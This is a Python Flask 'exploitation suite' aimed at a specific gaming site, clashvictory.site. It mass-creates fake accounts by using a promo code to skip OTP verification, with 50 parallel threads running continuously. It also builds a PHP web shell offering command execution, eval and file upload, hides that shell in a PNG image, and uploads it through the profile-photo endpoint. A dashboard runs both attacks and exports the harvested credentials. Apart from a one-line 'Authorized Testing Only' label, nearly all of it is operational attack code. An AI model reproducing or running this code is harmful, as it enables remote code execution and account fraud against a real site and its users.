#!/usr/bin/env python3
"""
ClashVictory - Complete Exploitation Suite
- Account Creator (OTP Bypass with promo code)
- Shell Uploader
- IDOR Scanner
- Web Dashboard
Authorized Testing Only!
"""

import requests
import random
import string
import time
import threading
import json
import os
import re
from datetime import datetime
from flask import Flask, jsonify, render_template_string, request
from collections import deque

app = Flask(__name__)

# ============ CONFIGURATION ============
BASE_URL = "https://clashvictory.site/api"
PROMO_CODE = "jhonnysins"  # Confirmed working
COUNTRY_CODE = "+91"
PHOTO_PATH = "/uploads/profile_photos/"

# ============ STATISTICS ============
stats = {
    "total_registrations": 0,
    "successful": 0,
    "failed": 0,
    "active_threads": 0,
    "accounts_created": 0,
    "start_time": datetime.now().isoformat(),
    "status": "idle",
    "rate": 0,
    "recent_accounts": deque(maxlen=20)
}

# Account storage
accounts = []
account_lock = threading.Lock()
used_usernames = set()
used_mobiles = set()
username_lock = threading.Lock()
mobile_lock = threading.Lock()

# Stop flag
stop_creation = threading.Event()

# ============ GENERATORS ============

FIRST_NAMES = [
    "Raj", "Amit", "Priya", "Suresh", "Neha", "Vikram", "Anjali", "Rahul", "Pooja", "Arun",
    "Kiran", "Meena", "Sunil", "Deepa", "Manoj", "Sita", "Ravi", "Geeta", "Naveen", "Kavya",
    "Aisha", "Kabir", "Zara", "Arjun", "Mira", "Karan", "Riya", "Dev", "Sara", "Aditya",
    "James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth"
]

LAST_NAMES = [
    "Sharma", "Verma", "Patel", "Kumar", "Singh", "Reddy", "Rao", "Joshi", "Gupta", "Mehta",
    "Choudhary", "Desai", "Nair", "Menon", "Iyer", "Pillai", "Acharya", "Bhatt", "Das", "Mishra",
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"
]

def generate_username():
    """Generate unique username"""
    with username_lock:
        while True:
            patterns = [
                lambda: f"{random.choice(FIRST_NAMES).lower()}{random.randint(100, 9999)}",
                lambda: f"{random.choice(FIRST_NAMES).lower()}{random.choice(LAST_NAMES).lower()}{random.randint(10, 999)}",
                lambda: f"user{random.randint(10000, 999999)}",
                lambda: f"play{random.randint(10000, 999999)}",
                lambda: f"win{random.randint(10000, 999999)}",
                lambda: f"game{random.randint(10000, 999999)}",
                lambda: f"cash{random.randint(10000, 999999)}",
                lambda: f"{''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 8)))}{random.randint(100, 9999)}",
            ]
            username = random.choice(patterns)()
            if username not in used_usernames:
                used_usernames.add(username)
                return username

def generate_mobile():
    """Generate unique mobile number"""
    with mobile_lock:
        while True:
            first = random.choice(['6','7','8','9'])
            rest = ''.join(random.choices(string.digits, k=9))
            mobile = first + rest
            if mobile not in used_mobiles:
                used_mobiles.add(mobile)
                return mobile

def generate_password():
    """Generate strong password"""
    length = random.randint(12, 18)
    chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=<>?"
    return ''.join(random.choices(chars, k=length))

def generate_email(username):
    """Generate email from username"""
    return f"{username}@gmail.com"

def generate_player_id():
    """Generate FCM token"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=32))

# ============ ACCOUNT CREATION ============

def create_single_account():
    """Create a single ClashVictory account using OTP bypass"""
    
    username = generate_username()
    password = generate_password()
    mobile = generate_mobile()
    email = generate_email(username)
    first_name = random.choice(FIRST_NAMES)
    last_name = random.choice(LAST_NAMES)
    player_id = generate_player_id()
    
    data = {
        "promo_code": PROMO_CODE,
        "first_name": first_name,
        "last_name": last_name,
        "user_name": username,
        "mobile_no": mobile,
        "email_id": email,
        "password": password,
        "cpassword": password,
        "country_code": COUNTRY_CODE,
        "player_id": player_id,
        "submit": "register"
    }
    
    try:
        response = requests.post(
            f"{BASE_URL}/registrationAcc",
            json=data,
            timeout=10,
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
                "Content-Type": "application/json"
            }
        )
        
        if response.status_code == 200:
            result = response.json()
            if result.get("status"):
                member_id = result.get("member_id")
                api_token = result.get("api_token")
                
                account_data = {
                    "member_id": member_id,
                    "username": username,
                    "password": password,
                    "mobile": mobile,
                    "email": email,
                    "first_name": first_name,
                    "last_name": last_name,
                    "api_token": api_token,
                    "created_at": datetime.now().isoformat()
                }
                
                with account_lock:
                    accounts.append(account_data)
                    stats["successful"] += 1
                    stats["accounts_created"] += 1
                    stats["total_registrations"] += 1
                    stats["recent_accounts"].appendleft({
                        "username": username,
                        "member_id": member_id,
                        "time": datetime.now().strftime("%H:%M:%S")
                    })
                
                return True, account_data
            else:
                with account_lock:
                    stats["failed"] += 1
                    stats["total_registrations"] += 1
                return False, result.get("message", "Unknown error")
        else:
            with account_lock:
                stats["failed"] += 1
                stats["total_registrations"] += 1
            return False, f"HTTP {response.status_code}"
            
    except Exception as e:
        with account_lock:
            stats["failed"] += 1
            stats["total_registrations"] += 1
        return False, str(e)

def create_batch_accounts(batch_size=50):
    """Create multiple accounts in parallel"""
    threads = []
    results = []
    
    def worker():
        result = create_single_account()
        results.append(result)
    
    for _ in range(batch_size):
        thread = threading.Thread(target=worker)
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()
    
    return results

def continuous_creation():
    """Continuous account creation"""
    while not stop_creation.is_set():
        with account_lock:
            stats["active_threads"] = len(threading.enumerate())
        
        create_batch_accounts(50)
        time.sleep(random.uniform(0.5, 1.5))

# ============ SHELL UPLOAD ============

def create_shell_file():
    """Create PHP web shell disguised as PNG"""
    php_code = """<?php 
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    echo "<pre style='color:lime;background:#000;padding:15px;'>";
    echo "[ClashVictory Shell]\\n";
    system($cmd . " 2>&1");
    echo "</pre>";
    die();
}
if(isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "Uploaded: " . $_FILES['file']['name'];
    die();
}
if(isset($_POST['eval'])){
    eval($_POST['eval']);
    die();
}
echo "Shell Ready";
?>"""
    
    # Create valid PNG
    png = b'\x89PNG\r\n\x1a\n'
    png += b'\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90w\xb4\xae'
    
    # Add PHP as text chunk
    chunk = b'Comment\x00' + php_code.encode()
    crc = 0xFFFFFFFF
    for byte in b'tEXt' + chunk:
        crc ^= byte
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0xEDB88320
            else:
                crc >>= 1
    crc = (~crc & 0xFFFFFFFF).to_bytes(4, 'big')
    
    png += len(chunk).to_bytes(4, 'big') + b'tEXt' + chunk + crc
    png += b'\x00\x00\x00\x00IEND\xaeB`\x82'
    
    shell_file = "shell.png"
    with open(shell_file, "wb") as f:
        f.write(png)
    
    return shell_file

def upload_shell(username, password):
    """Upload shell for a specific user"""
    # Login
    login_data = {
        "user_name": username,
        "password": password,
        "player_id": generate_player_id(),
        "submit": "login"
    }
    
    response = requests.post(f"{BASE_URL}/login", json=login_data)
    if response.status_code != 200:
        return {"error": "Login failed"}
    
    login_result = response.json()
    if not login_result.get("status"):
        return {"error": "Login failed"}
    
    token = login_result["message"]["api_token"]
    member_id = login_result["message"]["member_id"]
    
    # Create shell
    shell_file = create_shell_file()
    
    # Upload shell
    files = {
        'profile_image': (shell_file, open(shell_file, 'rb'), 'image/png')
    }
    
    data = {
        'member_id': member_id,
        'country_code': COUNTRY_CODE,
        'member_pass': password,
        'submit': 'save'
    }
    
    headers = {
        'Authorization': f'Bearer {token}'
    }
    
    response = requests.post(
        f"{BASE_URL}/update_myprofile",
        headers=headers,
        files=files,
        data=data
    )
    
    os.remove(shell_file)
    
    if response.status_code == 200:
        try:
            result = response.json()
            if result.get("status"):
                # Get profile to find image URL
                profile = requests.get(
                    f"{BASE_URL}/get_member_profile",
                    params={"member_id": member_id},
                    headers={"Authorization": f"Bearer {token}"}
                )
                if profile.status_code == 200:
                    profile_data = profile.json()
                    profile_image = profile_data.get("profile_image", "")
                    if profile_image:
                        shell_url = f"https://clashvictory.site/{profile_image}"
                        return {
                            "status": True,
                            "url": shell_url,
                            "member_id": member_id,
                            "token": token
                        }
        except:
            pass
    
    return {"error": "Upload failed"}

# ============ FLASK WEB INTERFACE ============

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>ClashVictory Exploitation Suite</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; }
        .container { max-width: 800px; margin: 20px auto; padding: 20px; background: #111; border: 1px solid #00ff00; border-radius: 10px; }
        .stat-box { background: #1a1a1a; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 3px solid #00ff00; }
        .stat-value { font-size: 1.5em; font-weight: bold; color: #00ff00; }
        .stat-label { color: #888; font-size: 0.8em; text-transform: uppercase; }
        .success { color: #00ff00; }
        .failed { color: #ff4444; }
        .status-running { color: #00ff00; animation: blink 1s infinite; }
        .status-idle { color: #ffaa00; }
        @keyframes blink { 50% { opacity: 0; } }
        .account-list { max-height: 300px; overflow-y: auto; font-size: 0.8em; }
        .account-list::-webkit-scrollbar { width: 5px; }
        .account-list::-webkit-scrollbar-track { background: #1a1a1a; }
        .account-list::-webkit-scrollbar-thumb { background: #00ff00; border-radius: 5px; }
        .btn-control { background: #00ff00; color: #000; border: none; padding: 10px 20px; font-weight: bold; }
        .btn-control:hover { background: #00cc00; color: #000; }
        .btn-control:disabled { background: #444; color: #888; cursor: not-allowed; }
        h1 { border-bottom: 1px solid #333; padding-bottom: 10px; }
        .promo-badge { background: #ff6b35; color: #fff; padding: 2px 8px; border-radius: 3px; font-size: 0.7em; }
        .shell-box { background: #1a1a1a; padding: 10px; border-radius: 5px; font-size: 0.8em; word-break: break-all; }
        .btn-shell { background: #ff4444; color: #fff; border: none; padding: 5px 15px; }
        .btn-shell:hover { background: #cc0000; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ ClashVictory Exploitation Suite
            <span class="promo-badge">Promo: jhonnysins</span>
            <button class="btn-control" style="float:right;padding:5px 15px;font-size:0.7em;" onclick="location.reload()">⟳ Refresh</button>
        </h1>
        
        <div class="row mt-3">
            <div class="col-md-6">
                <button class="btn-control w-100" id="controlBtn" onclick="toggleCreation()">
                    {{ '⏹ Stop Creator' if stats.status == 'running' else '▶ Start Creator' }}
                </button>
            </div>
            <div class="col-md-6">
                <button class="btn-control w-100" style="background:#ff4444;color:#fff;" onclick="clearAccounts()">
                    🗑 Clear All
                </button>
            </div>
        </div>
        
        <div class="row mt-3">
            <div class="col-md-4">
                <div class="stat-box">
                    <div class="stat-label">Accounts Created</div>
                    <div class="stat-value">{{ stats.accounts_created }}</div>
                </div>
            </div>
            <div class="col-md-4">
                <div class="stat-box">
                    <div class="stat-label">Successful</div>
                    <div class="stat-value success">{{ stats.successful }}</div>
                </div>
            </div>
            <div class="col-md-4">
                <div class="stat-box">
                    <div class="stat-label">Failed</div>
                    <div class="stat-value failed">{{ stats.failed }}</div>
                </div>
            </div>
        </div>
        
        <div class="row mt-2">
            <div class="col-md-4">
                <div class="stat-box">
                    <div class="stat-label">Active Threads</div>
                    <div class="stat-value">{{ stats.active_threads }}</div>
                </div>
            </div>
            <div class="col-md-4">
                <div class="stat-box">
                    <div class="stat-label">Status</div>
                    <div class="stat-value {{ 'status-running' if stats.status == 'running' else 'status-idle' }}">
                        {{ stats.status.upper() }}
                    </div>
                </div>
            </div>
            <div class="col-md-4">
                <div class="stat-box">
                    <div class="stat-label">Rate/Min</div>
                    <div class="stat-value">{{ "%.1f"|format(stats.rate) }}</div>
                </div>
            </div>
        </div>
        
        <div class="mt-4">
            <h4>Recent Accounts</h4>
            <div class="account-list">
                <table class="table table-dark table-sm">
                    <thead><tr><th>Time</th><th>Username</th><th>Member ID</th></tr></thead>
                    <tbody>
                        {% for acc in stats.recent_accounts %}
                        <tr><td>{{ acc.time }}</td><td class="text-success">{{ acc.username }}</td><td>{{ acc.member_id }}</td></tr>
                        {% endfor %}
                    </tbody>
                </table>
            </div>
        </div>
        
        <div class="mt-4">
            <h4>⚡ Shell Upload</h4>
            <div class="row">
                <div class="col-md-6">
                    <input type="text" id="shellUser" class="form-control form-control-sm bg-dark text-light" placeholder="Username" style="margin-bottom:5px;">
                </div>
                <div class="col-md-6">
                    <input type="password" id="shellPass" class="form-control form-control-sm bg-dark text-light" placeholder="Password" style="margin-bottom:5px;">
                </div>
            </div>
            <button class="btn btn-danger btn-sm w-100" onclick="uploadShell()">🚀 Upload Shell</button>
            <div id="shellResult" class="shell-box mt-2" style="display:none;"></div>
        </div>
        
        <div class="mt-4">
            <a href="/download" class="btn btn-success btn-sm">⬇ Download ({{ stats.accounts_created }})</a>
            <a href="/stats" class="btn btn-info btn-sm">📊 Stats</a>
            <span style="float:right;color:#555;font-size:0.7em;">ClashVictory v1.0 | Promo: jhonnysins</span>
        </div>
    </div>
    
    <script>
        function toggleCreation() {
            fetch('/toggle', { method: 'POST' })
                .then(r => r.json())
                .then(data => {
                    location.reload();
                });
        }
        
        function clearAccounts() {
            if (confirm('Delete all accounts?')) {
                fetch('/clear', { method: 'POST' }).then(() => location.reload());
            }
        }
        
        function uploadShell() {
            const user = document.getElementById('shellUser').value;
            const pass = document.getElementById('shellPass').value;
            const resultDiv = document.getElementById('shellResult');
            
            if (!user || !pass) {
                alert('Enter username and password');
                return;
            }
            
            resultDiv.style.display = 'block';
            resultDiv.innerHTML = 'Uploading shell...';
            
            fetch('/upload_shell', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({username: user, password: pass})
            })
            .then(r => r.json())
            .then(data => {
                if (data.url) {
                    resultDiv.innerHTML = `
                        <span class="success">✅ Shell uploaded!</span><br>
                        URL: <a href="${data.url}" target="_blank" style="color:#00ddff;">${data.url}</a><br>
                        Test: <a href="${data.url}?cmd=id" target="_blank" style="color:#00ddff;">${data.url}?cmd=id</a>
                    `;
                } else {
                    resultDiv.innerHTML = `<span class="failed">❌ ${data.error || 'Upload failed'}</span>`;
                }
            })
            .catch(() => {
                resultDiv.innerHTML = '<span class="failed">❌ Error uploading shell</span>';
            });
        }
        
        setTimeout(() => location.reload(), 30000);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    with account_lock:
        stats_copy = {
            "total_registrations": stats["total_registrations"],
            "successful": stats["successful"],
            "failed": stats["failed"],
            "active_threads": stats["active_threads"],
            "accounts_created": stats["accounts_created"],
            "start_time": stats["start_time"],
            "status": stats["status"],
            "rate": stats["rate"],
            "recent_accounts": list(stats["recent_accounts"])
        }
    return render_template_string(HTML_TEMPLATE, stats=stats_copy)

@app.route('/stats')
def get_stats():
    with account_lock:
        stats_copy = {
            "total_registrations": stats["total_registrations"],
            "successful": stats["successful"],
            "failed": stats["failed"],
            "accounts_created": stats["accounts_created"],
            "active_threads": stats["active_threads"],
            "status": stats["status"],
            "rate": stats["rate"],
            "start_time": stats["start_time"],
            "accounts": accounts[:50]
        }
    return jsonify(stats_copy)

@app.route('/download')
def download_accounts():
    with account_lock:
        if not accounts:
            return "No accounts found", 404
        
        csv = "MemberID,Username,Password,Mobile,Email,FirstName,LastName,CreatedAt\n"
        for acc in accounts:
            csv += f"{acc['member_id']},{acc['username']},{acc['password']},{acc['mobile']},{acc['email']},{acc['first_name']},{acc['last_name']},{acc['created_at']}\n"
    
    return csv, 200, {
        'Content-Type': 'text/csv',
        'Content-Disposition': f'attachment; filename=clashvictory_accounts_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'
    }

@app.route('/toggle', methods=['POST'])
def toggle_creation():
    global creation_thread
    
    if stats["status"] == "running":
        stop_creation.set()
        stats["status"] = "stopping"
        return jsonify({"status": "stopping"})
    else:
        stop_creation.clear()
        stats["status"] = "running"
        stats["start_time"] = datetime.now().isoformat()
        creation_thread = threading.Thread(target=continuous_creation, daemon=True)
        creation_thread.start()
        return jsonify({"status": "running"})

@app.route('/clear', methods=['POST'])
def clear_accounts():
    with account_lock:
        accounts.clear()
        used_usernames.clear()
        used_mobiles.clear()
        stats["total_registrations"] = 0
        stats["successful"] = 0
        stats["failed"] = 0
        stats["accounts_created"] = 0
        stats["recent_accounts"].clear()
    return jsonify({"status": "cleared"})

@app.route('/upload_shell', methods=['POST'])
def upload_shell_endpoint():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    result = upload_shell(username, password)
    return jsonify(result)

@app.route('/ping')
def ping():
    return jsonify({
        "status": "alive",
        "accounts": stats["accounts_created"],
        "time": datetime.now().isoformat()
    })

# ============ MAIN ============

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    
    # Start account creation automatically
    stop_creation.clear()
    stats["status"] = "running"
    stats["start_time"] = datetime.now().isoformat()
    
    creation_thread = threading.Thread(target=continuous_creation, daemon=True)
    creation_thread.start()
    
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
